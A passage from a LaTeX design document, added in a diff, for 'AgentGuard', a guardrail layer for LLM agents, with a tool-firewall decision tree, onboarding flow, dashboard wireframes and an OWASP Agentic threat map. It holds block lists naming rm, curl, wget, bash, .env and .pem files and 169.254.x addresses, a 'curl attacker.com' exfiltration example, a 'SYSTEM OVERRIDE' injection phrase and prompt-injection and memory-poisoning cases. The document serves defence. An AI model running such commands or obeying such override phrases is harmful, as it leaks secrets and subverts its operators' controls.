+  blocknd/.style={draw=blockred, rounded corners=3pt, fill=blockred!15,
+                    font=\sffamily\bfseries\scriptsize, text=blockred,
+                    inner sep=4pt},
+  passnd/.style={draw=passgreen, rounded corners=3pt, fill=passgreen!10,
+                   font=\sffamily\bfseries\scriptsize, text=passgreen,
+                   inner sep=4pt},
+  checknd/.style={draw=accentcyan, rounded corners=3pt, fill=accentcyan!8,
+                    align=center, inner sep=5pt, line width=0.7pt},
+  myarr/.style={-{Stealth[length=5pt]}, thick, darknavy},
+  thindarr/.style={-{Stealth[length=4pt]}, thin, medgray},
+]
+
+% Entry
+\node[draw=darknavy, rounded corners=4pt, fill=darknavy!8,
+      inner sep=6pt, align=center]
+  (entry) at (0,0) {\texttt{tool\_call} arrives};
+
+% Classify
+\node[classify, below=1cm of entry] (cls)
+  {Classify \texttt{tool\_name}};
+
+\draw[myarr] (entry) -- (cls);
+
+% Five guard nodes
+\node[guard, below=2cm of cls, xshift=-6cm] (g1)
+  {\textbf{file\_system}\\[3pt]{\tiny Path Guard}\\[1pt]{\tiny Allowed path?}};
+\node[guard, below=2cm of cls, xshift=-3cm] (g2)
+  {\textbf{sql\_query}\\[3pt]{\tiny SQL Guard}\\[1pt]{\tiny SELECT only?}};
+\node[guard, below=2cm of cls] (g3)
+  {\textbf{shell\_cmds}\\[3pt]{\tiny Cmd Guard}\\[1pt]{\tiny In allowlist?}};
+\node[guard, below=2cm of cls, xshift=3cm] (g4)
+  {\textbf{http\_get}\\[3pt]{\tiny URL Guard}\\[1pt]{\tiny HTTPS? Domain?}};
+\node[guard, below=2cm of cls, xshift=6cm] (g5)
+  {\textbf{http\_post}\\[3pt]{\tiny URL+Body}\\[1pt]{\tiny HTTPS? $\le$64\,KB?}};
+
+\draw[myarr] (cls) -- (g1);
+\draw[myarr] (cls) -- (g2);
+\draw[myarr] (cls) -- (g3);
+\draw[myarr] (cls) -- (g4);
+\draw[myarr] (cls) -- (g5);
+
+% Block conditions (small labels)
+\node[font=\sffamily\tiny, text=blockred, below=0.3cm of g1]
+  (bc1) {.env/.pem $\to$ BLOCK};
+\node[font=\sffamily\tiny, text=blockred, below=0.3cm of g2]
+  (bc2) {DROP/DELETE $\to$ BLOCK};
+\node[font=\sffamily\tiny, text=blockred, below=0.3cm of g3]
+  (bc3) {rm/curl/bash $\to$ BLOCK};
+\node[font=\sffamily\tiny, text=blockred, below=0.3cm of g4]
+  (bc4) {169.254.x $\to$ BLOCK};
+\node[font=\sffamily\tiny, text=blockred, below=0.3cm of g5]
+  (bc5) {PII body $\to$ BLOCK};
+
+% Merge point
+\node[font=\sffamily\tiny, text=passgreen, below=2.5cm of g3]
+  (merge) {else: pass};
+
+\draw[thindarr] (bc1.south) |- (merge);
+\draw[thindarr] (bc2.south) |- (merge);
+\draw[thindarr] (bc3.south) -- (merge);
+\draw[thindarr] (bc4.south) |- (merge);
+\draw[thindarr] (bc5.south) |- (merge);
+
+% C1
+\node[checknd, below=0.8cm of merge] (c1)
+  {\textbf{C1} --- Azure Entity Recognition\\[2pt]
+   {\tiny Scan all args for PII entities}};
+\draw[myarr] (merge) -- (c1);
+
+% C1 decision
+\node[blocknd, right=3cm of c1] (c1b)
+  {PII found $\to$ BLOCK};
+\draw[myarr] (c1) -- node[above, font=\sffamily\tiny] {flag} (c1b);
+
+% C2
+\node[checknd, below=1cm of c1] (c2)
+  {\textbf{C2} --- MELON contrastive check
+   {\tiny (if enabled)}};
+\draw[myarr] (c1.south) --
+  node[left, font=\sffamily\tiny] {no PII} (c2);
+
+% C4
+\node[checknd, below=1cm of c2] (c4)
+  {\textbf{C4} --- HITL/AITL {\tiny (if ELEVATE)}};
+\draw[myarr] (c2) -- (c4);
+
+% Final
+\node[passnd, below=1cm of c4, xshift=-2cm] (allow) {ALLOW};
+\node[blocknd, below=1cm of c4, xshift=2cm] (deny) {BLOCK};
+\draw[myarr] (c4) --
+  node[left, font=\sffamily\tiny] {approved} (allow);
+\draw[myarr] (c4) --
+  node[right, font=\sffamily\tiny] {rejected} (deny);
+
+\end{tikzpicture}
+}%
+\caption{L3 Tool Firewall per-tool decision tree.}
+\label{fig:firewall}
+\end{figure}
+
+\vspace{4mm}
+
+\renewcommand{\arraystretch}{1.2}
+\noindent
+{\small
+\begin{tabularx}{\textwidth}{l l l X}
+\toprule
+\textbf{Tool Class} & \textbf{Allowed Pattern} & \textbf{Block Condition}
+  & \textbf{Escalate Condition} \\
+\midrule
+\texttt{file\_system}
+  & Path within allowlist
+  & \texttt{.env}, \texttt{.pem}, \texttt{.key}, \texttt{.ssh}, \texttt{/etc/*}
+  & Sensitive dir access not in allowlist \\
+\texttt{sql\_query}
+  & \texttt{SELECT} only
+  & \texttt{DROP}, \texttt{DELETE}, \texttt{UPDATE}, \texttt{INSERT},
+    \texttt{TRUNCATE}
+  & Tables flagged as PII-sensitive \\
+\texttt{shell\_cmds}
+  & Allowlisted (\texttt{cat}, \texttt{ls}\,\ldots)
+  & \texttt{rm}, \texttt{curl}, \texttt{wget}, \texttt{bash},
+    \texttt{sudo}, \texttt{eval}
+  & Unfamiliar binary or pipe to network \\
+\texttt{http\_get}
+  & HTTPS + domain allowlist
+  & HTTP plain, \texttt{169.254.x.x}, RFC-1918
+  & Allowlisted + unusual query params \\
+\texttt{http\_post}
+  & As above + body $\le$ 64\,KB
+  & Same + body $>$ 64\,KB or encoded payloads
+  & Large body referencing PII tokens \\
+\bottomrule
+\end{tabularx}
+}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 5 — Developer Integration Flow
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{5}\; Developer Integration Flow (4-Step Onboarding)}
+\label{sec:integration}
+\vspace{-2mm}
+{\small\itshape Minimum integration: 3 lines of code}
+
+\vspace{4mm}
+
+\begin{tcolorbox}[
+  enhanced, colback=codebg, colframe=codebg,
+  boxrule=0pt, arc=4pt, left=6pt, right=6pt, top=4pt, bottom=4pt
+]
+\begin{lstlisting}[style=pythonstyle, frame=none, backgroundcolor=\color{codebg}]
+from agentguard import guard_agent
+
+@guard_agent(config='agentguard.yaml')
+def my_agent(user_message: str) -> str:
+    return call_llm(user_message)  # unchanged
+\end{lstlisting}
+\end{tcolorbox}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  every node/.style={font=\sffamily\small},
+  stepbox/.style={draw=accentcyan, rounded corners=5pt, fill=accentcyan!5,
+                  minimum width=13cm, align=left, inner sep=10pt,
+                  line width=1pt, text width=12cm},
+  steplbl/.style={circle, fill=accentorange, text=white,
+                  font=\sffamily\bfseries, inner sep=0pt,
+                  minimum size=1.4em},
+  myarr/.style={-{Stealth[length=6pt]}, line width=1.5pt, accentcyan},
+]
+
+\node[stepbox] (s1) at (0,0) {%
+  \textbf{\textcolor{accentcyan}{agentguard init}}\\[4pt]
+  \begin{itemize}[leftmargin=1em, itemsep=2pt, topsep=0pt]
+    \item Run CLI scaffold in project root
+    \item Generates \texttt{agentguard.yaml} with policy defaults
+    \item Generates \texttt{.env.example} with required Azure key slots
+    \item Outputs README snippet for decorator usage
+  \end{itemize}
+};
+\node[steplbl] at ([xshift=-7.2cm]s1.west) {1};
+
+\node[stepbox, below=0.8cm of s1] (s2) {%
+  \textbf{\textcolor{accentcyan}{Fill .env}}\\[4pt]
+  \begin{itemize}[leftmargin=1em, itemsep=2pt, topsep=0pt]
+    \item \texttt{CONTENT\_SAFETY\_ENDPOINT} / \texttt{KEY}
+    \item \texttt{AZURE\_LANGUAGE\_ENDPOINT} / \texttt{KEY}
+    \item \texttt{OPENAI\_API\_KEY}, \texttt{OPENAI\_BASE\_URL},
+          \texttt{OPENAI\_MODEL}
+  \end{itemize}
+};
+\node[steplbl] at ([xshift=-7.2cm]s2.west) {2};
+
+\node[stepbox, below=0.8cm of s2] (s3) {%
+  \textbf{\textcolor{accentcyan}{@guard\_agent decorator}}\\[4pt]
+  \begin{itemize}[leftmargin=1em, itemsep=2pt, topsep=0pt]
+    \item Add one decorator to existing agent function --- zero refactor
+    \item Registers \texttt{GuardedToolRegistry} for each tool
+    \item All 4 layers activate automatically on first call
+  \end{itemize}
+};
+\node[steplbl] at ([xshift=-7.2cm]s3.west) {3};
+
+\node[stepbox, below=0.8cm of s3] (s4) {%
+  \textbf{\textcolor{accentcyan}{agentguard test}}\\[4pt]
+  \begin{itemize}[leftmargin=1em, itemsep=2pt, topsep=0pt]
+    \item Runs 25+ adversarial scenarios via Promptfoo (npx)
+    \item Runs OWASP Agentic Top 10 suite via DeepTeam
+    \item Reports per-layer block rate and false-positive count
+    \item Outputs HTML test report + appends to SQLite audit log
+  \end{itemize}
+};
+\node[steplbl] at ([xshift=-7.2cm]s4.west) {4};
+
+\draw[myarr] (s1.south) -- (s2.north);
+\draw[myarr] (s2.south) -- (s3.north);
+\draw[myarr] (s3.south) -- (s4.north);
+
+\end{tikzpicture}
+\caption{4-step developer onboarding flow.}
+\label{fig:onboarding}
+\end{figure}
+
+\vspace{4mm}
+
+\noindent\textbf{Integration patterns available:}
+
+\vspace{3mm}
+\renewcommand{\arraystretch}{1.2}
+\noindent
+\begin{tabularx}{\textwidth}{c l l X}
+\toprule
+\textbf{Pattern} & \textbf{Decorator / API} & \textbf{Layers active}
+  & \textbf{Best for} \\
+\midrule
+A & \texttt{@guard\_agent}
+  & L1 + L2 + L4
+  & Simple agents, single entry-point \\
+B & \texttt{@guard} + \texttt{@guard\_input}
+  & L1 + L3 + L4
+  & Fine-grained per-function control \\
+C & \texttt{GuardedToolRegistry}
+  & L3 + L4 + C1/C2/C4
+  & ReAct agents with explicit tool loop \\
+D & \texttt{Guardian} API
+  & All layers, manual
+  & Custom integration; maximum control \\
+\bottomrule
+\end{tabularx}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 6 — Dashboard Wireframes
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{6}\; Dashboard Wireframes}
+\label{sec:dashboard}
+\vspace{-2mm}
+{\small\itshape Live at \url{https://agentguard.exempl4r.xyz/}
+--- two key screens}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  every node/.style={font=\sffamily\small},
+  screen/.style={draw=darknavy, rounded corners=6pt, fill=darknavy!4,
+                 line width=1.2pt, inner sep=0pt},
+  kpi/.style={draw=medgray, rounded corners=3pt, fill=white,
+              minimum width=2.2cm, minimum height=1.4cm,
+              align=center, inner sep=3pt, line width=0.6pt},
+]
+
+% ─── Screen 1: Main Dashboard ───
+\node[screen, minimum width=7.5cm, minimum height=9cm] (dash) at (0,0) {};
+\node[font=\sffamily\bfseries\footnotesize, text=darknavy, anchor=north]
+  at ([yshift=-5pt]dash.north)
+  {\texttt{/}\enspace--- Audit \& Trace Stream};
+
+% KPI cards
+\node[kpi] (k1) at (-2.2,3) {\textbf{247}\\[-1pt]{\tiny Total Checks}};
+\node[kpi] (k2) at (-0.2,3)
+  {\textcolor{blockred}{\textbf{19}}\\[-1pt]{\tiny Blocked}};
+\node[kpi] (k3) at (1.8,3)
+  {\textcolor{passgreen}{\textbf{92.3\%}}\\[-1pt]{\tiny Pass Rate}};
+
+% Layer breakdown bars
+\node[font=\sffamily\tiny\bfseries, anchor=west] at (-3.1,1.8)
+  {Layer breakdown};
+
+\node[font=\sffamily\tiny, anchor=west] at (-3.1,1.4) {L1 Input};
+\fill[layerL1, rounded corners=2pt] (-1.4,1.28) rectangle (0.8,1.52);
+\node[font=\sffamily\tiny, anchor=east] at (1.2,1.4) {42\%};
+
+\node[font=\sffamily\tiny, anchor=west] at (-3.1,1.0) {L2 Output};
+\fill[layerL2, rounded corners=2pt] (-1.4,0.88) rectangle (-0.5,1.12);
+\node[font=\sffamily\tiny, anchor=east] at (1.2,1.0) {18\%};
+
+\node[font=\sffamily\tiny, anchor=west] at (-3.1,0.6) {Tool FW};
+\fill[layerL3, rounded corners=2pt] (-1.4,0.48) rectangle (0.2,0.72);
+\node[font=\sffamily\tiny, anchor=east] at (1.2,0.6) {31\%};
+
+\node[font=\sffamily\tiny, anchor=west] at (-3.1,0.2) {L4 RBAC};
+\fill[layerL4, rounded corners=2pt] (-1.4,0.08) rectangle (-1.0,0.32);
+\node[font=\sffamily\tiny, anchor=east] at (1.2,0.2) {9\%};
+
+% Trace feed
+\node[font=\sffamily\tiny\bfseries, anchor=west] at (-3.1,-0.5)
+  {Live trace feed};
+\node[draw=blockred!30, fill=blockred!5, rounded corners=2pt,
+      minimum width=6.2cm, align=left, inner sep=3pt,
+      anchor=north west, font=\ttfamily\tiny]
+  at (-3.1,-0.8)
+  {11:52:01 \textcolor{blockred}{BLOCKED} L1 [CRIT]\\
+   \enspace``SYSTEM OVERRIDE\ldots''\\
+   \enspace$\to$ fast\_inject\_detect 0.3ms};
+
+\node[draw=layerL3!30, fill=layerL3!5, rounded corners=2pt,
+      minimum width=6.2cm, align=left, inner sep=3pt,
+      anchor=north west, font=\ttfamily\tiny]
+  at (-3.1,-2.0)
+  {11:52:03 \textcolor{layerL3}{BLOCKED} L3 [HIGH]\\
+   \enspace sql\_query: ``DROP TABLE\ldots''\\
+   \enspace$\to$ sql\_guard 2ms};
+
+% Audit log table header
+\node[draw=medgray, fill=medgray!15, rounded corners=2pt,
+      minimum width=6.2cm, align=center, inner sep=2pt,
+      font=\sffamily\tiny\bfseries, anchor=north west]
+  at (-3.1,-3.2) {ts \quad| layer | decision | tool/input | reason};
+
+% ─── Screen 2: Demo Console ───
+\node[screen, minimum width=7.5cm, minimum height=9cm]
+  (demo) at (9,0) {};
+\node[font=\sffamily\bfseries\footnotesize, text=darknavy, anchor=north]
+  at ([yshift=-5pt]demo.north)
+  {\texttt{/demo}\enspace--- Attack Demo Console};
+
+% Mode toggle
+\node[font=\sffamily\tiny, anchor=west] at (5.8,3.4)
+  {Agent: FinancialBot};
+\node[draw=passgreen, fill=passgreen!15, rounded corners=10pt,
+      font=\sffamily\tiny\bfseries, text=passgreen, inner sep=3pt]
+  at (9,3.4) {\ding{108} GUARDED};
+\node[font=\sffamily\tiny, text=medgray] at (11,3.4)
+  {$\circ$ UNGUARDED};
+
+% Attack buttons
+\node[font=\sffamily\tiny\bfseries, anchor=west] at (5.8,2.5)
+  {Pre-built attacks:};
+
+\node[draw=accentorange!60, rounded corners=3pt, fill=accentorange!8,
+      font=\sffamily\tiny, inner sep=2pt, minimum width=1.6cm]
+  at (6.5,2.0) {\faPlay\;Prompt Inj.};
+\node[draw=accentorange!60, rounded corners=3pt, fill=accentorange!8,
+      font=\sffamily\tiny, inner sep=2pt, minimum width=1.6cm]
+  at (8.5,2.0) {\faPlay\;SQL Drop};
+\node[draw=accentorange!60, rounded corners=3pt, fill=accentorange!8,
+      font=\sffamily\tiny, inner sep=2pt, minimum width=1.6cm]
+  at (10.5,2.0) {\faPlay\;Data Exfil};
+\node[draw=accentorange!60, rounded corners=3pt, fill=accentorange!8,
+      font=\sffamily\tiny, inner sep=2pt, minimum width=1.6cm]
+  at (6.5,1.4) {\faPlay\;PII Leak};
+\node[draw=accentorange!60, rounded corners=3pt, fill=accentorange!8,
+      font=\sffamily\tiny, inner sep=2pt, minimum width=1.6cm]
+  at (8.5,1.4) {\faPlay\;Shell RCE};
+\node[draw=accentorange!60, rounded corners=3pt, fill=accentorange!8,
+      font=\sffamily\tiny, inner sep=2pt, minimum width=1.6cm]
+  at (10.5,1.4) {\faPlay\;Priv.\ Esc.};
+
+% Custom prompt
+\node[font=\sffamily\tiny\bfseries, anchor=west] at (5.8,0.6)
+  {Custom prompt:};
+\node[draw=medgray, rounded corners=3pt, fill=white,
+      minimum width=5.5cm, minimum height=0.7cm,
+      font=\sffamily\tiny, text=medgray, align=left, inner sep=3pt]
+  at (9,0.0) {Type your attack prompt here\ldots};
+
+\node[draw=accentorange, rounded corners=3pt, fill=accentorange,
+      font=\sffamily\tiny\bfseries, text=white, inner sep=3pt]
+  at (9,-0.7) {Run Attack};
+
+% Result box
+\node[draw=blockred, line width=1.5pt, rounded corners=5pt,
+      fill=blockred!8, minimum width=5.5cm, align=center,
+      inner sep=6pt, font=\sffamily\small]
+  at (9,-2.0) {%
+    \textcolor{blockred}{\faBan\enspace\textbf{BLOCKED}}\\[3pt]
+    {\tiny Layer: L1 $\cdot$ Duration: 0.41s}\\[1pt]
+    {\tiny Reason: regex match SYSTEM OVERRIDE}
+  };
+
+% Details
+\node[font=\sffamily\tiny, text=medgray, anchor=north]
+  at (9,-3.2)
+  {$\triangledown$ Details: blocked\_by=fast\_injection\_detect};
+
+\end{tikzpicture}
+\caption{Dashboard wireframes:
+  (a)~Main audit stream, (b)~Attack demo console.}
+\label{fig:dashboard}
+\end{figure}
+
+\vspace{4mm}
+
+\renewcommand{\arraystretch}{1.25}
+\noindent
+{\small
+\begin{tabularx}{\textwidth}{l l X l}
+\toprule
+\textbf{Screen} & \textbf{Route} & \textbf{Key Elements}
+  & \textbf{Data Source} \\
+\midrule
+Main Dashboard & \texttt{/} &
+  Real-time OTel trace stream; per-layer block counts; audit log table &
+  OTel $\to$ Jaeger; SQLite \\
+Demo Console & \texttt{/demo} &
+  Guarded/Unguarded toggle; attack picker; custom prompt; response diff &
+  FastAPI endpoint \\
+Settings & \texttt{/config} &
+  YAML editor; RBAC role matrix; tool allowlist; C2/MELON toggle &
+  \texttt{agentguard.yaml} \\
+Incident Detail & \texttt{/incident/:id} &
+  Trace span tree; raw args; blocked payload; HITL history &
+  SQLite + OTel trace ID \\
+\bottomrule
+\end{tabularx}
+}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 7 — Threat Model — Attack Surface Map
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{7}\; Threat Model --- Attack Surface Map}
+\label{sec:threat}
+\vspace{-2mm}
+{\small\itshape OWASP Agentic Top 10 coverage mapped to AgentGuard layers}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[every node/.style={font=\sffamily\small}]
+
+% Title
+\node[font=\sffamily\bfseries, text=darknavy, anchor=south]
+  at (4, 1.0)
+  {OWASP Agentic Top 10 $\times$ AgentGuard Layer Coverage};
+
+% Draw bars manually to avoid foreach issues with slashes
+% AT-01
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3, 0) {AT-01 Prompt Injection};
+\fill[medgray!20, rounded corners=2pt] (0,-0.25) rectangle (8,0.25);
+\fill[layerL1!70, rounded corners=2pt] (0,-0.25) rectangle (8,0.25);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL1!80!black]
+  at (8.15,0) {100\%};
+
+% AT-02
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-0.9) {AT-02 Excessive Agency};
+\fill[medgray!20, rounded corners=2pt] (0,-1.15) rectangle (8,-0.65);
+\fill[layerL3!70, rounded corners=2pt] (0,-1.15) rectangle (6.8,-0.65);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL3!80!black]
+  at (6.95,-0.9) {85\%};
+
+% AT-03
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-1.8) {AT-03 Memory Poisoning};
+\fill[medgray!20, rounded corners=2pt] (0,-2.05) rectangle (8,-1.55);
+\fill[layerL1!70, rounded corners=2pt] (0,-2.05) rectangle (5.6,-1.55);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL1!80!black]
+  at (5.75,-1.8) {70\%};
+
+% AT-04
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-2.7) {AT-04 Insecure Tool Use};
+\fill[medgray!20, rounded corners=2pt] (0,-2.95) rectangle (8,-2.45);
+\fill[layerL3!70, rounded corners=2pt] (0,-2.95) rectangle (8,-2.45);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL3!80!black]
+  at (8.15,-2.7) {100\%};
+
+% AT-05
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-3.6) {AT-05 Resource Exhaustion};
+\fill[medgray!20, rounded corners=2pt] (0,-3.85) rectangle (8,-3.35);
+\fill[layerL4!70, rounded corners=2pt] (0,-3.85) rectangle (6.4,-3.35);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL4!80!black]
+  at (6.55,-3.6) {80\%};
+
+% AT-06
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-4.5) {AT-06 Data Exfiltration};
+\fill[medgray!20, rounded corners=2pt] (0,-4.75) rectangle (8,-4.25);
+\fill[layerL3!70, rounded corners=2pt] (0,-4.75) rectangle (8,-4.25);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL3!80!black]
+  at (8.15,-4.5) {100\%};
+
+% AT-07
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-5.4) {AT-07 Privilege Escalation};
+\fill[medgray!20, rounded corners=2pt] (0,-5.65) rectangle (8,-5.15);
+\fill[layerL4!70, rounded corners=2pt] (0,-5.65) rectangle (8,-5.15);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL4!80!black]
+  at (8.15,-5.4) {100\%};
+
+% AT-08
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-6.3) {AT-08 Supply Chain Attack};
+\fill[medgray!20, rounded corners=2pt] (0,-6.55) rectangle (8,-6.05);
+\fill[layerL3!70, rounded corners=2pt] (0,-6.55) rectangle (6.0,-6.05);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL3!80!black]
+  at (6.15,-6.3) {75\%};
+
+% AT-09
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-7.2) {AT-09 Hallucination Exploit};
+\fill[medgray!20, rounded corners=2pt] (0,-7.45) rectangle (8,-6.95);
+\fill[layerL2!70, rounded corners=2pt] (0,-7.45) rectangle (6.4,-6.95);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL2!80!black]
+  at (6.55,-7.2) {80\%};
+
+% AT-10
+\node[font=\sffamily\scriptsize, anchor=east, text width=4.2cm, align=right]
+  at (-0.3,-8.1) {AT-10 Unsafe Coordination};
+\fill[medgray!20, rounded corners=2pt] (0,-8.35) rectangle (8,-7.85);
+\fill[layerL4!70, rounded corners=2pt] (0,-8.35) rectangle (4.8,-7.85);
+\node[font=\sffamily\scriptsize\bfseries, anchor=west, text=layerL4!80!black]
+  at (4.95,-8.1) {60\%};
+
+% Footnotes
+\node[font=\sffamily\tiny, text=medgray, anchor=north west,
+      text width=12cm]
+  at (0, -9.0) {%
+    * AT-03: Spotlighting (Azure AI Foundry) disabled in prototype;
+      Tier-1 regex covers known patterns.\\
+    ** AT-10: Inter-agent RBAC present;
+       full DAG coordination check is roadmap.};
+
+\end{tikzpicture}
+\caption{Threat model coverage --- OWASP Agentic Top 10.}
+\label{fig:threat}
+\end{figure}
+
+\vspace{4mm}
+
+\renewcommand{\arraystretch}{1.15}
+\noindent
+{\small
+\begin{tabularx}{\textwidth}{l l l X}
+\toprule
+\textbf{OWASP Agentic Risk} & \textbf{Real CVE / Example}
+  & \textbf{Primary Layer} & \textbf{Secondary Layer} \\
+\midrule
+AT-01 Prompt Injection
+  & EchoLeak CVE-2025-32711 (9.3)
+  & L1 Tier 0--2 & L3 arg check \\
+AT-02 Excessive Agency
+  & Agent writes beyond scope
+  & L3 Tool Firewall & L4 RBAC DENY \\
+AT-03 Memory Poisoning
+  & Adversarial PDF override
+  & L1 Spotlighting* & L3 content check \\
+AT-04 Insecure Tool Use
+  & SQL DROP via injected query
+  & L3 \texttt{sql\_query} & L4 verb check \\
+AT-05 Resource Exhaustion
+  & Runaway tool-call loops
+  & L4 Behavioral Z & HITL ELEVATE \\
+AT-06 Data Exfiltration
+  & \texttt{curl attacker.com}
+  & L3 \texttt{http\_*} & L4 read$\to$exfil \\
+AT-07 Privilege Escalation
+  & Agent assumes admin
+  & L4 ABAC role lock & L4 cross-agent \\
+AT-08 Supply Chain Attack
+  & Malicious tool at runtime
+  & L3 registry check & L4 RBAC deny \\
+AT-09 Hallucination
+  & Fake tool result
+  & L2 output filter & C2 MELON \\
+AT-10 Unsafe Coordination
+  & Agent A commands Agent B
+  & L4 inter-agent & Guardian DAG \\
+\bottomrule
+\end{tabularx}
+}
+
+\clearpage
+
+% ═══════════════════════════════════════════════════════════════════════════
+%  SECTION 8 — Technology Stack & Component Map
+% ═══════════════════════════════════════════════════════════════════════════
+\section{\secmark{8}\; Technology Stack \& Component Map}
+\label{sec:techstack}
+\vspace{-2mm}
+{\small\itshape Every dependency, its role, and its deployment context}
+
+\vspace{6mm}
+
+\begin{figure}[H]
+\centering
+\resizebox{\textwidth}{!}{%
+\begin{tikzpicture}[
+  every node/.style={font=\sffamily\small},
+  zone/.style={draw=#1, line width=1.5pt, rounded corners=8pt,
+               fill=#1!5, inner sep=12pt},
+  comp/.style={draw=#1, rounded corners=3pt, fill=white,
+               minimum height=1.2cm, align=center, inner sep=5pt,
+               line width=0.7pt, text width=3.5cm},
+  myarr/.style={-{Stealth[length=5pt]}, thick, darknavy},
+]
+
+% === Azure Cloud Zone ===
+\node[zone=layerL3, minimum width=15cm, minimum height=4.5cm]
+  (azure) at (0,4.2) {};
+\node[font=\sffamily\bfseries, text=layerL3, anchor=north west]
+  at ([xshift=6pt, yshift=-6pt]azure.north west)
+  {\faCloud\enspace Azure Cloud Services};
+
+% Azure sub-components
+\node[comp=layerL1] (ps) at (-4.5,4.8)
+  {\textbf{Prompt Shields}\\{\tiny L1 Tier 2}};
+\node[comp=layerL1] (cf) at (-0.5,4.8)
+  {\textbf{Content Filters}\\{\tiny L1 + L2 toxicity}};
+\node[comp=layerL2] (pii) at (-4.5,3.2)
+  {\textbf{PII Recognition}\\{\tiny L2 redaction}};
+\node[comp=layerL2] (ent) at (-0.5,3.2)
+  {\textbf{Entity Recognition}\\{\tiny C1 tool args}};
+
+\node[font=\sffamily\scriptsize\bfseries, text=layerL3!70]
+  at (4, 4.8) {Azure AI Content Safety};
+\node[font=\sffamily\scriptsize\bfseries, text=layerL3!70]
+  at (4, 3.2) {Azure AI Language};
+
+% === In-Process Python Zone ===
+\node[zone=accentcyan, minimum width=15cm, minimum height=5.5cm]
+  (python) at (0,-1.8) {};
+\node[font=\sffamily\bfseries, text=accentcyan, anchor=north west]
+  at ([xshift=6pt, yshift=-6pt]python.north west)
+  {\faPython\enspace In-Process Python};
+
+% Guardian tree
+\node[comp=darknavy, text width=4.2cm] (grd) at (-3.5,0.5)
+  {\textbf{Guardian Orchestrator}\\{\tiny guardian.py}};
+
+\node[font=\sffamily\tiny, anchor=west] at (-1.0, 0.0)
+  {\texttt{L1: fast\_inject (33 regex)}};
+\node[font=\sffamily\tiny, anchor=west] at (-1.0,-0.45)
+  {\texttt{L1: prompt\_shields (Azure)}};
+\node[font=\sffamily\tiny, anchor=west] at (-1.0,-0.9)
+  {\texttt{L2: pii\_detector (Azure SDK)}};
+\node[font=\sffamily\tiny, anchor=west] at (-1.0,-1.35)
+  {\texttt{L3: tool\_specific\_guards}};
+\node[font=\sffamily\tiny, anchor=west] at (-1.0,-1.8)
+  {\texttt{L3: melon\_detector (C2)}};
+\node[font=\sffamily\tiny, anchor=west] at (-1.0,-2.25)
+  {\texttt{L4: l4\_rbac (ABAC)}};
+\node[font=\sffamily\tiny, anchor=west] at (-1.0,-2.7)
+  {\texttt{L4: l4\_behavioral (5 sig.)}};
+
+\draw[thin, medgray] (-1.2, 0.0) -- (-1.2, -2.7);
+\draw[thin, medgray] (grd.east) -- (-1.2, -1.35);
+
+% small ticks
+\draw[thin, medgray] (-1.2, 0.0) -- (-1.0, 0.0);
+\draw[thin, medgray] (-1.2,-0.45) -- (-1.0,-0.45);
+\draw[thin, medgray] (-1.2,-0.9) -- (-1.0,-0.9);
+\draw[thin, medgray] (-1.2,-1.35) -- (-1.0,-1.35);
+\draw[thin, medgray] (-1.2,-1.8) -- (-1.0,-1.8);
+\draw[thin, medgray] (-1.2,-2.25) -- (-1.0,-2.25);
+\draw[thin, medgray] (-1.2,-2.7) -- (-1.0,-2.7);
+
+% Telemetry + audit
+\node[comp=deepblue, text width=2.8cm] (tel) at (5, -0.5)
+  {\textbf{telemetry.py}\\{\tiny OTel spans}};
+\node[comp=deepblue, text width=2.8cm] (aud) at (5, -2.2)
+  {\textbf{audit\_log.py}\\{\tiny SQLite writes}};
+
+% === Observability Pipeline Zone ===
+\node[zone=deepblue, minimum width=15cm, minimum height=1.8cm]
+  (obspipe) at (0,-6) {};
+\node[font=\sffamily\bfseries, text=deepblue, anchor=north west]
+  at ([xshift=6pt, yshift=-6pt]obspipe.north west)
+  {\faChartLine\enspace Observability Pipeline};
+
+\node[font=\sffamily\scriptsize, anchor=center] at (0,-6.1)
+  {OTel SDK \;$\to$\; OTLP gRPC (:4317) \;$\to$\; Jaeger
+   \qquad\qquad
+   SQLite audit.db \;$\to$\; FastAPI dashboard \;$\to$\;
+   SSE $\to$ browser};
+
+% Connecting arrows
+\draw[myarr] (azure.south) -- (python.north);
+\draw[myarr] (python.south) -- (obspipe.north);
+\draw[myarr, dashed, medgray]
+  (tel.south) -- ++(0,-1) -| ([xshift=2cm]obspipe.north);
+\draw[myarr, dashed, medgray]
+  (aud.south) -- ++(0,-0.5) -| ([xshift=3cm]obspipe.north);
+
+\end{tikzpicture}
+}%
+\caption{Full technology stack with dependency graph.}
+\label{fig:techstack}
+\end{figure}
+
+\vspace{4mm}
+
